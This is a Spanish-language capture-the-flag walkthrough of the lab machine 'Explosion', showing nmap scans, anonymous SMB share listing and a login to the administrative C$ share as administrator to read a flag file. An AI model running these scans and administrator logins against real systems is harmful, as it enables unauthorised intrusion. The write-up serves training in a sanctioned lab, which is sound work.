# Explosion

🗹 Verificar si el host está activo:

```shell
ping -c 1 10.129.1.13

PING 10.129.1.13 (10.129.1.13) 56(84) bytes of data.
64 bytes from 10.129.1.13: icmp_seq=1 ttl=127 time=176 ms

--- 10.129.1.13 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 175.846/175.846/175.846/0.000 ms
```

> Sistema operativo: **Windows**

🗹 Identificar puertos abiertos y qué servicios están corriendo:

```shell
sudo nmap -p- -sS --open --min-rate 5000 -n -Pn -vv 10.129.1.13 -oG openPorts

PORT      STATE SERVICE       REASON
135/tcp   open  msrpc         syn-ack ttl 127
139/tcp   open  netbios-ssn   syn-ack ttl 127
445/tcp   open  microsoft-ds  syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127
5985/tcp  open  wsman         syn-ack ttl 127
49664/tcp open  unknown       syn-ack ttl 127
49665/tcp open  unknown       syn-ack ttl 127
49666/tcp open  unknown       syn-ack ttl 127
49667/tcp open  unknown       syn-ack ttl 127
49668/tcp open  unknown       syn-ack ttl 127
49669/tcp open  unknown       syn-ack ttl 127
49670/tcp open  unknown       syn-ack ttl 127
49671/tcp open  unknown       syn-ack ttl 127
```

🗹 Ejecutar scripts para recopilar información adicional:

```shell
sudo nmap -p 135,139,445,3389,5985,49664,49665,49666,49667,49668,49669,49670,49671 -sCV 10.129.1.13 -oN targeted

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-03-07T14:14:18+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: EXPLOSION
|   NetBIOS_Domain_Name: EXPLOSION
|   NetBIOS_Computer_Name: EXPLOSION
|   DNS_Domain_Name: Explosion
|   DNS_Computer_Name: Explosion
|   Product_Version: 10.0.17763
|_  System_Time: 2024-03-07T14:13:45+00:00
| ssl-cert: Subject: commonName=Explosion
| Not valid before: 2024-03-06T14:00:08
|_Not valid after:  2024-09-05T14:00:08
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  unknown
49670/tcp open  tcpwrapped
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-03-07T14:13:42
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

| Puerto | Servicio      | Versión                                 |
| ------ | ------------- | --------------------------------------- |
| 135    | msrpc         | Microsoft Windows RPC                   |
| 139    | netbios-ssn   | Microsoft Windows netbios-ssn           |
| 445    | microsoft-ds  | ?                                       |
| 3389   | ms-wbt-server | Microsoft Terminal Services             |
| 5985   | http          | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |
| 49664  | unknown       | ?                                       |
| 49665  | unknown       | ?                                       |
| 49666  | msrpc         | Microsoft Windows RPC                   |
| 49667  | msrpc         | Microsoft Windows RPC                   |
| 49668  | msrpc         | Microsoft Windows RPC                   |
| 49669  | unknown       | ?                                       |
| 49670  | tcpwrapped    | ?                                       |
| 49671  | msrpc         | Microsoft Windows RPC                   |

🗹 Listar servicios disponibles en el servidor sin proporcionar contraseña:

```shell
smbclient -L 10.129.1.13

Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```

🗹 Conectarse al servicio SMB y obtener la flag:

```shell
smbclient //10.129.1.13/C$ -U administrator

smb: \> more \Users\Administrator\Desktop\flag.txt
```
## Flag

La flag se encuentra en el directorio `\Users\Administrator\Desktop\`.
